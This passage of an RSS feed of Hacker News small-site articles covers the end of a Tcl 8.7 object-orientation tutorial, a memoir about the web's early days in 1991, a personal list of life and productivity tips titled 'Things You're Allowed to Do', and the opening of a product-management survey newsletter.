                    </ul>
                    <p>
                        Here is an example, contrived as always. We have a <code>Service</code> class which acts as a base for various kinds of services (daemons for the Unix weenies), database, network and so on. It has <code>stop</code> and <code>abort</code> methods which end the service both of which call <code>Terminate</code> to exit.
                    </p>
                    <pre><code>oo::class create Service {
    method Terminate {code} { puts "Exiting with code $code" }
    method stop {} { my Terminate 0 }
    method abort {} { my Terminate 1 }
}</code></pre>
                    <p>
                        The service is obedient and stops when told.
                    </p>
                    <pre><code>% Service create service
::service
% service stop
Exiting with code 0</code></pre>
                    <p>
                        Now along comes a programmer who appreciates the extensive functionality of our class and extends it to write a network server.
                    </p>
                    <pre><code>oo::class create NetworkService {
    superclass Service
    method accept {client} { blah blah }
    method disconnect {client} {
        # Do some cleanup
        my Terminate $client; # close connection
    }
    method Terminate {client} {
        puts "Closing client connection"
    }
}</code></pre>
                    <p>
                        Unfortunately, now the service does not stop when commanded to do so. It tries to close some imaginary client connection instead.
                    </p>
                    <pre><code>% NetworkService create netservice
::netservice
% netservice stop
Closing client connection</code></pre>
                    <p>
                        The problem of course is that the utility method <code>Terminate</code> has been unknowingly overridden. There is no isolation provided for the parent class from any of its child classes.
                    </p>
                    <p>
                        In Tcl 8.7, you can define <em>private</em> methods to fix this. Calls to a method marked private will never be overridden in the context of the class that defines that method.
                    </p>
                    <p>
                        Let us try it out in our example. Instead of rewriting the class, we'll just do some targeted surgery to redefine the method as private.
                    </p>
                    <pre><code>% oo::define Service {deletemethod Terminate}
% oo::define Service {private method Terminate {code} {puts "Exiting with code $code"}}
% netservice stop
Exiting with code 0</code></pre>
                    <p>
                        As an aside, notice TclOO's dynamic nature — the existing <code>netservice</code> <strong>object</strong> also picked up the corrected behaviour.
                    </p>
                    <p>
                        Some additional points:
                    </p>
                    <ul>
                        <li>
                            <p>
                                Variables suffer from similar problems for similar reasons. A class may inadvertently name a variable that is already in use for a different purpose in a superclass or mixin. This is also resolved by defining variables as <code>private variable</code> analogously to private methods.
                            </p>
                        </li>
                        <li>
                            <p>
                                Methods that are forwards can also be defined with the <code>private</code> designation.
                            </p>
                        </li>
                        <li>
                            <p>
                                Private methods are not just for classes but can also be defined for objects though they are less useful there as objects themselves cannot be derived from.
                            </p>
                        </li>
                        <li>
                            <p>
                                Just like <code>oo:define</code>, <code>private</code> can either be used to define a single method as above or take a single argument which is a script within which multiple methods, forwards and variables are defined. This is convenient for clubbing together the entire private section of a class.
                            </p>
                        </li>
                        <li>
                            <p>
                                The <code>info class</code> and <code>info object</code> introspection commands take a new <code>-scope</code> option.
                            </p>
                        </li>
                    </ul>
                    <pre><code>% info class methods Service -scope private
Terminate
% info class methods Service -scope public
abort stop
% info class methods Service -scope unexported
% </code></pre>
                    <p>
                        The <code>unexported</code> value corresponds roughly (but not exactly!) to protected in C++ terminology. They are not visible from outside the object's context but because they are not private, they are callable from methods defined in subclasses. We did not have any in our example.
                    </p>
                    <p>
                        See <a href="https://core.tcl-lang.org/tips/doc/trunk/tip/500.md">TIP 500</a> for more examples of private methods and variables.
                    </p>
                    <h2>
                        Inline export modifiers
                    </h2>
                    <p>
                        In Tcl 8.6 methods were exported by default based on whether they started with a lowercase letter or not. You could change the visibility of a method using the <code>export</code> and <code>unexport</code> commands. For example,
                    </p>
                    <pre><code>oo::class create Users {
    variable users
    method +user {name address} { set users($name) $address}
    method -user {name} { unset -nocomplain users($name) }
    export +user -user
}</code></pre>
                    <p>
                        Because they do not begin with a lower case letter, the methods to add and remove users have to be explicitly exported. Separating the visibility from the method definition is somewhat of an irritation so Tcl 8.7 allows you to modify it with the <code>-export</code> option in the method definition itself.
                    </p>
                    <pre><code>oo::class create Users {
    variable users
    method +user -export {name address} { set users($name) $address}
    method -user -export {name} { unset -nocomplain users($name) }
}</code></pre>
                    <p>
                        Conversely, there is an <code>-unexport</code> option that will hide a method that would be exported by the default rules.
                    </p>
                    <h2>
                        New slot operations
                    </h2>
                    <p>
                        First, some background. One of the special features of Tcl's OO system is that unlike other languages it is completely dynamic in keeping with Tcl's philosophy. Class structures, relationships, object types, interfaces can all be manipulated <strong>even at runtime</strong>.
                    </p>
                    <p>
                        Continuing our tradition of silly examples, suppose our web server defines a request class as follows. All methods are guarded by a <a href="https://www.magicsplat.com/articles/oo.html#sect_oo_filters">filter</a> that denies access based on client location.
              …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.magicsplat.com/blog/tcl87-oo/">https://www.magicsplat.com/blog/tcl87-oo/</a></em></p>]]>
            </description>
            <link>https://www.magicsplat.com/blog/tcl87-oo/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25514055</guid>
            <pubDate>Wed, 23 Dec 2020 03:25:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[30 Years Later: Early Days of the Web]]>
            </title>
            <description>
<![CDATA[
Score 17 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25513720">thread link</a>) | @DanielKehoe
<br/>
December 22, 2020 | https://blog.yax.com/posts/early-days-of-the-web-1991/ | <a href="https://web.archive.org/web/*/https://blog.yax.com/posts/early-days-of-the-web-1991/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div>
                <div itemprop="articleBody">
                    
                    <hr> 
                    <p>The web is thirty years old this month, counting from the date the <a href="https://www.w3.org/2012/08/history-of-the-web/origins.htm">first web server was launched on Christmas 1990</a>. Personally, August 6th, 1991, is more significant, when the web was publicly announced.</p>

<p>In 1991 I was writing for <em>NeXTWORLD</em> magazine, which was a lot of fun, because I got to work with, and write about, people who were doing fascinating things with computer technology. Working for <em>NeXTWORLD</em> led to writing the book <em>Taking the Next Step</em> and a short stint at Steve Jobs’s <a href="https://en.wikipedia.org/wiki/NeXT">NeXT</a> as a technical writer.</p>

<p>The most innovative project I encountered that year was not NeXT. Rather, it was something developed by Tim Berners-Lee, a researcher at CERN, the European particle physics laboratory. He used a NeXT computer to develop a networked information system for high-energy physicists. If I hadn’t been reading  the <em>comp.sys.next</em> Usenet newsgroups carefully, I would have missed the announcement of a “a hypertext editor for the NeXT.”</p>

<p>Not many people used “WWWNeXTStepEditor version 0.12.” The NeXT community was small and many NeXT computer users did not yet have Internet access, which was required to access Tim Berners-Lee’s experimental “WorldWideWeb” documents. To me, the name WorldWideWeb seemed a bit of a conceit since the only users at the time were high-energy physicists at a few research institutes.</p>

<p>Nonetheless, as soon I’d installed and tried the software, I wanted to get involved. I told everyone about it, including a fellow editor at <em>NeXTWORLD,</em> <a href="https://en.wikipedia.org/wiki/John_Perry_Barlow">John Perry Barlow</a>. Barlow, a lyricist for the Grateful Dead, and cofounder of the (then-new) Electronic Frontier Foundation, wrote to his friend <a href="https://en.wikipedia.org/wiki/Mitch_Kapor">Mitch Kapor</a>…</p>

<p><img src="https://blog.yax.com/images/post1-barlow.gif" alt=""></p>

<p>If you don’t recognize Barlow’s references, <a href="https://en.wikipedia.org/wiki/Project_Xanadu" title="Project Xanadu">Project Xanadu</a> was a visionary hypertext project that predated the Internet. The Matrix is not the movie universe created by the Wachowskis but, rather the network of computer networks that existed before the commercialization of the Internet (as described by the researcher <a href="https://en.wikipedia.org/wiki/John_Quarterman">John Quarterman</a>).</p>

<p>Subsequently I joined the <a href="https://lists.w3.org/Archives/Public/www-talk/1991SepOct/0001.html">www-talk mailing list</a> and also contacted Tim Berners-Lee directly. I wanted to know if he was interesting in technology I’d heard about from friends at Adobe Systems. Adobe’s editable PostScript specification (which came to be named PDF and became the basis for a product named “Acrobat”) seemed to me a better match for distributed hypertext than the very-limited SGML-based “HTML tags” that Tim Berners-Lee was using. HTML offered only minimal layout and styling possibilities; <a href="https://en.wikipedia.org/wiki/PostScript">PostScript</a> was a better page description language.</p>

<p>Here’s an excerpt…</p>

<p><img src="https://blog.yax.com/images/post1-timbl.gif" alt=""></p>

<p>Tim Berners-Lee was reluctant to publicize that code for the web was available for free, as management at CERN had not yet agreed to release it publicly (that didn’t happen until <a href="https://cds.cern.ch/record/1164399">April 1993</a>), and I wasn’t able to write about it for <em>NeXTWORLD</em> (too bad, as I could have been the first journalist to write about the web!).</p>

<p>Subsequently, editable PostScript was released, and in 1993, <a href="https://en.wikipedia.org/wiki/Robert_Cailliau">Robert Cailliau</a> of CERN visited me in California. I arranged a meeting between Cailliau and management at Adobe Systems. He met with John Kunze of Adobe at the Stanford Linear Accelerator Center (SLAC) and demonstrated the World Wide Web — the first time management at Adobe had seen the Web. By that time, HTML was firmly entrenched as the native language of the new Web. Adobe later invested in Netscape Communications and produced an Acrobat plug-in for the Netscape Web browser, establishing the basis for viewing richly formatted PDF pages in web browsers.</p>

<p>For some years afterward, I regretted that the Adobe/WWW meeting had not taken place the previous year, because the sparse and limited HTML format might have been eclipsed by the richer format of PDF as the primary syntax of web pages. With the adoption of the <a href="http://www.w3.org/Style/LieBos2e/history/">Cascading Style Sheets specification</a> (from 1999 forward), my views changed, and I’ve come to appreciate that the technical underpinnings of the web are optimal, reflecting both the genius of Berners-Lee’s original vision and the rich contributions of the worldwide developer community.</p>

<p>Thirty years later, it is easy to overlook the web’s origins as a tool for sharing knowledge. Key to Tim Berners-Lee’s vision were open standards that reflected his belief in the <a href="https://www.w3.org/2001/tag/doc/leastPower">Rule of Least Power</a>, a principle that choosing the simplest and least powerful language for a given purpose allows you to do more with the data stored in that language (thus HTML is easier for humans or machines to interpret and analyze than PostScript). Along with open standards and the Rule of Least Power, Tim Berners-Lee wanted to make it easy for anyone to publish information in the form of web pages. His first web browser, named Nexus, was both a browser and editor. The NeXTSTEP SDK made editing easy to implement; editing was abandoned in subsequent non-NeXT web browsers.</p>

<p>I think we’ve lost sight of that original vision. Facebook or Wix make it easy to author web pages but at the cost of lock-in to proprietary systems. And when developers choose complex software such as React or Rails to build simple websites, I cringe at the violation of Rule of Least Power. I still have a “deep case of net religion” (as John Perry Barlow said in 1991) and I’m now writing about ways to build websites without frameworks and build tools (see my articles, <a href="https://tutorials.yax.com/articles/build-websites-the-yax-way/index.html">Build Websites the Yax Way</a>). My current project, <a href="https://yax.com/">Yax.com</a>, is a do-it-yourself website builder that uses new web standards (including web components) to help people build simple sites. Thirty years on, we still have a lot of work to do to realize the web’s original goals. I hope I’m not the only one who sees this.</p>

<p>I never anticipated that Berners-Lee’s NeXT hypertext project would become a medium to supplant print and television. In 1991, during idle moments, I imagined the world’s books and magazines might be reborn as hypertext (many others had imagined this earlier, including Ted Nelson, with his Xanadu project). But I never honestly believed that Berners-Lee’s software project could change the world. By 1999, as Web addresses appeared on billboards and the sides of buses, I started to accept that Berners-Lee naming his project “the WorldWide Web” was not vainglorious but simply prescient. Still, I hope his original vision of the web as a means for sharing the world’s knowledge is not eclipsed by its utility as a platform for commerce.</p>

<p><img src="https://blog.yax.com/images/post1-signature-dmk.gif" alt=""></p>

                </div>
                
                

            </div>
        </div></div>]]>
            </description>
            <link>https://blog.yax.com/posts/early-days-of-the-web-1991/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25513720</guid>
            <pubDate>Wed, 23 Dec 2020 02:21:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Things You're Allowed to Do]]>
            </title>
            <description>
<![CDATA[
Score 502 | Comments 399 (<a href="https://news.ycombinator.com/item?id=25513713">thread link</a>) | @thesephist
<br/>
December 22, 2020 | https://milan.cvitkovic.net/writing/things_youre_allowed_to_do/ | <a href="https://web.archive.org/web/*/https://milan.cvitkovic.net/writing/things_youre_allowed_to_do/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
<article>
    <p>This is a list of things you’re allowed to do that you thought you couldn’t, or didn’t even know you could.</p>
<p>I haven’t tried everything on this list, mainly due to cost.
But you’d be surprised how cheap most of the things on this list are (especially the free ones).</p>
<p><strong>Note that you can replace “hire” or “buy” with “barter for” or “find a DIY guide to” nearly everywhere below.</strong>
E.g. you can clean the bathroom in exchange for your housemate doing a couple hours research for you.</p>
<h3 id="learning-and-decision-making">Learning and decision making</h3>
<ul>
<li>Hire a researcher or expert consultant
<ul>
<li>I hired a researcher (<a href="https://acesounderglass.com/">Elizabeth Van Nostrand</a>, whom you can and should <a href="https://acesounderglass.com/hire-me/">hire</a> too) to help write this very post, which is largely about how to hire people to do things!</li>
<li>They can:
<ul>
<li>Help validate whether a crazy idea is possible</li>
<li>Do <a href="https://acesounderglass.com/tag/epistemicspotcheck/">epistemic spot checks</a> of your work</li>
<li>Map the landscape of opinions on a topic</li>
<li>Write literature surveys</li>
<li>Find people worth talking to about a potential topic and writing briefs about them</li>
<li>Opposition or market research</li>
<li>Find options for big purchases like houses or insurance</li>
<li>Compile datasets</li>
<li>Find un-Googleable things</li>
</ul>
</li>
<li>To find one:
<ul>
<li>Look for books or scholarly articles on the topic, and email the author
<ul>
<li>Graduate students are especially good, and often know more than the “experts”</li>
<li>If you find someone genuinely interested in what you’re working on, you might be able to collaborate and not pay</li>
</ul>
</li>
<li>Look for interested individuals in the long tail of blogs
<ul>
<li>E.g. by Google searching with <code>"site: medium.com"</code> and finding the authors</li>
</ul>
</li>
<li>Use a matchmaking service (see <a href="#appendix-sources-of-experts">Appendix</a>)</li>
<li>Search through professional organizations directories (e.g. Bar Association, American Academy of Pediatrics)</li>
<li>Google the topic +
<ul>
<li>“blog”</li>
<li>“podcast”</li>
<li>“expert witness”</li>
<li>“book”</li>
<li>“consultant”</li>
<li>“reddit”</li>
</ul>
</li>
</ul>
</li>
<li>What do I pay them?
<ul>
<li>Some post their prices online</li>
<li>If you’re hiring a grad student you can pay them at or above their school’s graduate student stipend, which you can Google.</li>
<li><a href="https://www.lesswrong.com/posts/evyBmPw9ZnzmoFmP6/experiment-a-good-researcher-is-hard-to-find">Make sure they get something out of the project</a> (and other tips)</li>
</ul>
</li>
</ul>
</li>
<li>Ask questions online
<ul>
<li>You know those answers you enjoy reading on Stack Exchange, Reddit, Quora, etc.?  Someone had to ask those questions. It can be you.</li>
<li>If you’re embarrassed by the question, it’s easy to be anonymous</li>
</ul>
</li>
<li>Run surveys
<ul>
<li>Twitter
<ul>
<li>Or ask someone with a larger following to do it</li>
</ul>
</li>
<li>Google Surveys</li>
<li>Amazon Mechanical Turk</li>
</ul>
</li>
<li>Run <a href="https://www.gwern.net/Nootropics#blinding-yourself">genuine randomized control trials on yourself</a></li>
<li>Buy research
<ul>
<li>See <a href="#appendix-sources-of-research">Appendix</a>, <a href="https://blog.alexa.com/sites-for-market-research/">here</a>, or <a href="https://web.jinfo.com/go/blog/73431">here</a></li>
<li>Or find it on <a href="https://twitter.com/Sci_Hub">SciHub</a> or <a href="https://twitter.com/libgen_project">Libgen</a></li>
</ul>
</li>
<li>Hire someone to pentest/doxx you
<ul>
<li>Or put out a bounty for it, like <a href="https://www.gwern.net/Blackmail#pseudonymity-bounty">Gwern used to</a></li>
</ul>
</li>
<li>Hire a graphic designer to turn your appalling sketches into beautiful diagrams or slides</li>
<li>Host small gatherings or conferences on topics you care about
<ul>
<li>These are much easier to set up than you’d think, especially in the age of Zoom</li>
<li>If you can use the gathering to bootstrap a group chat or community, so much the better!</li>
</ul>
</li>
<li>Hire a tutor
<ul>
<li><a href="https://www.italki.com/">Language tutors</a> are surprisingly cheap and better than any app</li>
<li><a href="https://www.wyzant.com/">Wyzant</a> and many other sites exist for general tutoring</li>
<li>For niche tutoring you can try general freelance sites like <a href="https://www.fiverr.com/">Fiverr</a> or <a href="https://www.upwork.com/">Upwork</a></li>
<li>Services like <a href="https://www.sharpestminds.com/">Sharpest Minds</a> exist for professional training</li>
</ul>
</li>
<li>Hire someone just as an excuse to make yourself complete a project
<ul>
<li>Sure you could proofread your own document.  But if you hire a proofreader, you have to actually deliver them something at some point.</li>
</ul>
</li>
</ul>
<h3 id="interpersonal">Interpersonal</h3>
<ul>
<li><a href="https://guzey.com/personal/what-should-you-do-with-your-life/#cold-emails-and-twitter">Cold contact people</a>
<ul>
<li>Yes, even famous people. Just make sure you have something to say.</li>
</ul>
</li>
<li><a href="https://guzey.com/follow-up/">Follow up many times</a>
<ul>
<li>You won’t make people mad if you’re polite.</li>
</ul>
</li>
<li>Just ask for things
<ul>
<li>Free upgrades</li>
<li>Coupons
<ul>
<li>At checkout you can just ask “Do you have any coupons I can apply to this?”</li>
</ul>
</li>
<li>Raises</li>
<li>Better terms in a job offer
<ul>
<li>Easier than asking for a raise - you have more leverage</li>
</ul>
</li>
<li>Waiving admission or graduation requirements</li>
<li>It’s okay if the things are crazy.  You can always mollify afterward by saying “I know that’s a crazy thing to ask for, but I have a rule that I always ask.”</li>
</ul>
</li>
<li><a href="http://mindingourway.com/obvious-advice/">Ask obvious questions</a></li>
<li>Buy goods/services from your friends
<ul>
<li>It’s not weird unless you make it weird</li>
<li>Everyone knows some starving artists and needs to buy holiday gifts</li>
<li>Doesn’t apply to every service obviously: don’t take out loans from your friends</li>
</ul>
</li>
<li>Not tell white lies
<ul>
<li>You can be nice and tell the truth at the same time.</li>
<li>Especially to children when they annoy you.</li>
</ul>
</li>
<li>Say “I don’t know” or “I don’t have an opinion” when you don’t</li>
<li>Ask people out on dates
<ul>
<li>This one might just be directed at young me…</li>
</ul>
</li>
<li>Don’t drink, even when you’re expected to
<ul>
<li>Don’t drink alcohol, I mean.</li>
<li>Actually heck, don’t drink water either if you don’t want.</li>
</ul>
</li>
<li>Travel to friends just to visit them</li>
<li>Move close to friends</li>
<li>Live in multiple places with multiple people
<ul>
<li>Rent spare rooms or couches part-time in multiple homes</li>
<li>Arrange your own timeshare system with friends</li>
</ul>
</li>
<li>Be a nomad</li>
<li>Romance
<ul>
<li>Hire a matchmaker</li>
<li>Buy premium versions of dating apps</li>
<li>Get couples therapy</li>
</ul>
</li>
<li>Give to charity
<ul>
<li>You really can, to the best of our knowledge, <a href="https://www.givewell.org/giving101/Your-dollar-goes-further-overseas">save someone’s (statistical) life</a> with not that much money.
Let that idea really, fully osmose through your brain before you pass it over.</li>
</ul>
</li>
</ul>
<h3 id="support-and-accountability">Support and accountability</h3>
<ul>
<li>Hire a coach
<ul>
<li>For your professional area
<ul>
<li><a href="https://www.newyorker.com/magazine/2011/10/03/personal-best">An Atul Gawande article on the subject</a></li>
<li><a href="https://www.npr.org/2020/02/03/802422904/when-things-click-the-power-of-judgment-free-learning">On clicker training</a></li>
</ul>
</li>
<li>Personal trainer</li>
<li>Nutritionist</li>
<li>Meditation guide</li>
</ul>
</li>
<li>Visit a therapist</li>
<li>Visit a physical therapist</li>
<li>Buy task-specific devices that prevent multitasking
<ul>
<li>Kindle</li>
<li>Freewrite Traveller</li>
<li>Dedicated music players</li>
<li>Dedicated notebooks for specific purposes (day planner, exercise log, etc.)</li>
</ul>
</li>
<li>Engage a human productivity monitor
<ul>
<li>I know two people who have hired people to sit next to them or frequently contact them to keep them on-task</li>
<li>Examples: <a href="https://www.focusmate.com/">focusmate.com</a> and <a href="https://coding-pal.com/">coding-pal.com</a></li>
</ul>
</li>
</ul>
<h3 id="making-the-most-of-your-resources">Making the most of your resources</h3>
<ul>
<li>Grocery delivery</li>
<li>Cleaning services
<ul>
<li>Can be regular or just when you need a big spring clean</li>
<li>Don’t forget carpet and vent cleaning</li>
</ul>
</li>
<li>Laundry service</li>
<li>Nannies over daycare</li>
<li>Modify your stuff
<ul>
<li>Tape over annoying LED lights</li>
<li>Remove logos (<a href="https://www.youtube.com/watch?v=WVeGDitPqKo">example</a>)</li>
<li>Write in books</li>
<li>Rip off tags</li>
<li>Rotate your monitor to portrait</li>
</ul>
</li>
<li>Repair your stuff, or get it repaired
<ul>
<li>Shoes</li>
<li>Clothes</li>
<li>Luggage and <a href="https://rainypass.com/">outdoor gear</a></li>
<li>Furniture</li>
<li>Car
<ul>
<li>You can buy at-home car care</li>
</ul>
</li>
</ul>
</li>
<li>Write on a post-it note affixed to a greeting card rather than on the greeting card itself, so the recipient can throw away the post-it and reuse your card
<ul>
<li>Employ similar logic for any disposable/consumable item</li>
</ul>
</li>
<li>Treat fines like payments
<ul>
<li>E.g. park illegally and let yourself think of the (expected value of the) fine as a parking fee</li>
<li>Obviously don’t break rules that matter like blocking a fire exit</li>
</ul>
</li>
<li><a href="https://donotpay.com/">Contest unjust fines</a></li>
<li>Telemedicine</li>
<li>Surgery for appearance or comfort</li>
<li>At-home vet care</li>
<li>Enroll <a href="https://www.dummies.com/health/how-to-enroll-in-a-clinical-trial/">yourself</a> (or <a href="https://loyalfordogs.com/">your pet</a>) in a clinical trial or research study</li>
<li>Generate your own audiobooks
<ul>
<li><a href="https://gutenbergreloaded.com/collections/all">gutenbergreloaded.com</a></li>
</ul>
</li>
<li>Generate your own ebooks
<ul>
<li><a href="https://1dollarscan.com/">1dollarscan.com</a></li>
</ul>
</li>
<li>Get verbal things written down
<ul>
<li><a href="https://transcribeme.com/">transcribeme.com</a></li>
<li><a href="https://otter.ai/">otter.ai</a></li>
</ul>
</li>
<li>Personal assistant services (or a real PA if you can afford it)
<ul>
<li><a href="https://getmagic.com/">Magic</a>, <a href="https://www.taskrabbit.com/">TaskRabbit</a>, <a href="https://www.fancyhands.com/">Fancy Hands</a>, and similar services can approximate many of these.
There are also more serious services like <a href="https://withdouble.com/">Double</a>.</li>
<li>Manage email</li>
<li>Helping you move</li>
<li>Getting visas and arranging travel</li>
<li>Stand in line for you</li>
<li>Errands</li>
<li>Filing paperwork</li>
</ul>
</li>
<li>And if you grew up in a thrifty family, like me:
<ul>
<li>Paying for parking in convenient location</li>
<li>Hotels where you can sleep comfortably</li>
<li>Non-public transportation, especially when traveling</li>
<li>Buying comfortable mattress, shoes, etc.</li>
<li>Buying clothes for appearance or comfort instead of just the lowest price</li>
<li>Bottled water when you’re thirsty
<ul>
<li>And in general fulfilling any bodily need for &lt; $5 (restrooms, buying a hat when you forgot yours, etc.)</li>
</ul>
</li>
<li>Buy your way out of advertising on e.g. Spotify or YouTube</li>
<li>Actually turn the heat/AC on
<ul>
<li>And in general, <a href="https://radimentary.wordpress.com/2018/01/29/hammertime-day-1-bug-hunt/">being willing to spend a few minutes to fix small annoyances</a></li>
<li>Seriously, just put WD-40 on that squeaky hinge already</li>
</ul>
</li>
</ul>
</li>
</ul>

<ul>
<li>Katja Grace’s <a href="https://meteuphoric.com/2014/03/25/how-to-trade-money-and-time/">How to trade money and time</a></li>
<li>Sam Bowman’s <a href="https://medium.com/@s8mb/things-i-recommend-you-buy-and-use-second-edition-457a8e7163f6">Things I Recommend You Buy and Use</a></li>
<li>Rob Wiblin <a href="https://medium.com/@robertwiblin/things-i-recommend-you-buy-and-use-rob-edition-1d7b2ce27d68">channeling Sam</a></li>
<li><a href="https://www.lesswrong.com/posts/KuFSkLwhSkEZJYALE/collating-widely-available-time-money-trades">Estimated hourly costs of buying free time</a> (see comments)</li>
</ul>
<hr>
<p><em>Thanks to
<a href="https://www.gwern.net/">Gwern</a>,
<a href="https://twitter.com/an1lam">Stephen Malina</a>,
<a href="https://twitter.com/alexeyguzey">Alexey Guzey</a>,
<a href="https://twitter.com/robot__dreams">Elliot Jin</a>,
<a href="https://twitter.com/iandanforth">iandanforth</a>,
<a href="https://twitter.com/jmclulow">Joshua M. Clulow</a>,
<a href="https://twitter.com/K4y1s">Kay</a>,
<a href="https://news.ycombinator.com/user?id=zoba">zoba</a>,
<a href="https://news.ycombinator.com/user?id=ryandrake">ryandrake</a>,
a guy I can’t name who offers “personal assistant concierge services for high-net-worth families,”
and <a href="https://acesounderglass.com/">Elizabeth Van Nostrand</a>
for some of the ideas above.</em></p>
<hr>



<table>
<thead>
  <tr>
    <th>Name</th>
    <th>Type</th>
    <th>Comments</th>
    <th>Target Audience</th>
    <th>URL</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>Expertise Finder</td>
    <td>Academics to comment on many subjects</td>
    <td></td>
    <td>Journalists</td>
    <td><a href="https://expertisefinder.com/">link</a></td>
  </tr>
  <tr>
    <td>Womenâ€™s Media Center SheSource</td>
    <td>Women only, focuses on current events and politics</td>
    <td></td>
    <td>Journalists</td>
    <td><a href="https://www.womensmediacenter.com/shesource/">link</a></td>
  </tr>
  <tr>
    <td>National Association of Personal Financial Advisors</td>
    <td>Financial only</td>
    <td>Seems like a low bar to entry</td>
    <td>Journalists</td>
    <td><a href="https://www.napfa.org/newsroom">link</a></td>
  </tr>
  <tr>
    <td>ProfNet</td>
    <td>Wide range of experts</td>
    <td>Owned by PR firm, presumably works for experts more than you</td>
    <td>Journalists</td>
    <td><a href="https://profnet.prnewswire.com/ProfNetHome/What-is-Profnet.aspx">link</a></td>
  </tr>
  <tr>
    <td>Coursera Expert Network</td>
    <td>Academics from top schools only</td>
    <td>Presumably biased towards people who have made Coursera courses</td>
    <td>Journalists</td>
    <td><a href="https://experts.coursera.org/">link</a></td>
  </tr>
  <tr>
    <td>ExpertFile</td>
    <td>Curated experts from universities, institutions, think tanks, associations, companies and other sources</td>
    <td></td>
    <td>Journalists</td>
    <td><a href="https://expertfile.com/">link</a></td>
  </tr>
  <tr>
    <td>GURU</td>
    <td>Aimed mostly at professional expertise (Sales, Marketing, Eng, etc.)</td>
    <td></td>
    <td>Businesses</td>
    <td><a href="https://www.guru.com/">link</a></td>
  </tr>
  <tr>
    <td>Amber Biology</td>
    <td>Biologists only</td>
    <td></td>
    <td>Science projects?</td>
    <td><a href="https://www.amberbiology.com/">link</a></td>
  </tr>
  <tr>
    <td>Help a Reporter Out (HARO)</td>
    <td></td>
    <td>Requires affiliation with a highly ranked website</td>
    <td>Journalists</td>
    <td><a href="https://www.helpareporter.com/">link</a></td>
  </tr>
  <tr>
    <td>Self Improvement Experts Directory</td>
    <td></td>
    <td></td>
    <td>Individuals</td>
    <td><a href="https://www.selfgrowth.com/experts.html">link</a></td>
  </tr>
  <tr>
    <td>JurisPro</td>
    <td>Expert witnesses</td>
    <td></td>
    <td>Lawyers</td>
    <td><a href="https://www.jurispro.com/">link</a></td>
  </tr>
  <tr>
    <td>ForensisGroup</td>
    <td>Expert witnesses</td>
    <td></td>
    <td>Lawyers</td>
    <td><a href="https://www.forensisgroup.com/">link</a></td>
  </tr>
  <tr>
    <td>Expert Institute</td>
    <td>Expert witnesses</td>
    <td></td>
    <td>Lawyers</td>
    <td><a href="https://www.expertinstitute.com/">link</a></td>
  </tr>
</tbody>
</table>                                                                                                                                   


<ul>
<li>Top choices:
<ul>
<li><a href="https://www.ibisworld.com/">IBIS</a></li>
<li><a href="https://profound.com/">Profound</a></li>
<li><a href="https://www.eifl.net/e-resources/research-monitor">Research Monitor</a></li>
<li><a href="https://www.euromonitor.com/store">EuroMonitor</a></li>
</ul>
</li>
<li><a href="https://www.insideview.com/">Inside View</a></li>
<li><a href="https://www.census.gov/">US Census Data</a></li>
<li><a href="https://www.sba.gov/offices/headquarters/oee/resources/2836">SBAâ€™s Office of Entrepreneurship Education Resources</a></li>
<li><a href="http://www.pewresearch.org/">Pew Research Center</a></li>
<li><a href="https://www.statista.com/">Statista</a></li>
<li><a href="https://www.marketresearch.com/">marketresearch.com</a></li>
<li><a href="https://www.plunkettresearch.com/how-to-buy/">Plunkett Research</a></li>
<li><a href="https://market-intelligence.com.au/">The Market Intelligence Co.</a></li>
<li><a href="https://www.jinfo.com/">Jinfo</a></li>
<li><a href="https://www.idc.com/">IDC</a></li>
<li><a href="https://www.gartner.com/en">Gartner</a></li>
<li><a href="https://pitchbook.com/">Pitchbook</a></li>
<li><a href="https://www.crunchbase.com/">Crunchbase</a></li>
</ul>
</article>

        </div></div>]]>
            </description>
            <link>https://milan.cvitkovic.net/writing/things_youre_allowed_to_do/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25513713</guid>
            <pubDate>Wed, 23 Dec 2020 02:20:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A comprehensive survey of Product Management]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25513614">thread link</a>) | @regera
<br/>
December 22, 2020 | https://www.lennyrachitsky.com/p/product-management-survey | <a href="https://web.archive.org/web/*/https://www.lennyrachitsky.com/p/product-management-survey">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>👋 Hello, I’m&nbsp;<a href="https://twitter.com/lennysan">Lenny</a>&nbsp;and welcome to a ✨&nbsp;<strong>once-a-month-free-edition&nbsp;</strong>✨ of my newsletter. Each week I humbly tackle reader questions about product, growth, working with humans, and anything else that’s stressing you out at the office.</em></p><p><em>If you’re not a paid subscriber, here’s what you missed this month:</em></p><ol><li><p><em><a href="https://www.lennyrachitsky.com/p/creating-buzz-at-launch-preview">Ten ways to generate buzz for your product</a></em></p></li><li><p><em><a href="https://www.lennyrachitsky.com/p/seo-experimentation">How to run SEO experiments</a></em></p></li><li><p><em><a href="https://www.lennyrachitsky.com/p/not-running-an-experiment">When NOT to run an experiment</a></em></p></li></ol><blockquote><h2>Q: What is the product manager role like at different companies?</h2></blockquote><p>What skills do companies look for in a PM? What do PMs need to get right to get promoted? How much influence do PMs have at different companies? There’s surprisingly little information out there about the differences in the PM role across the industry.</p><p>Today, I’m sharing findings from a survey I’ve been running over the past month, with nearly 1,000 responses from over 600 companies. Below, you’ll find:</p><ol><li><p>Which skills matter most when hiring PMs</p></li><li><p>What PMs have to get most right to get promoted</p></li><li><p>How much influence PMs have</p></li><li><p>Which companies prioritize Heart vs. Head vs. Hands</p></li><li><p>Takeaways, and links to dig deeper</p></li></ol><p><em>A big thank you to <a href="https://productmanagerhq.com/">PMHQ</a>, <a href="https://twitter.com/sriramk">Sriram Krishnan</a>, <a href="https://twitter.com/hnshah">Hiten Shah</a>, <a href="https://twitter.com/joshelman">Josh Elman</a>, <a href="https://twitter.com/ianmcall">Ian McAllister</a> for helping amplify this survey to get more responses, and 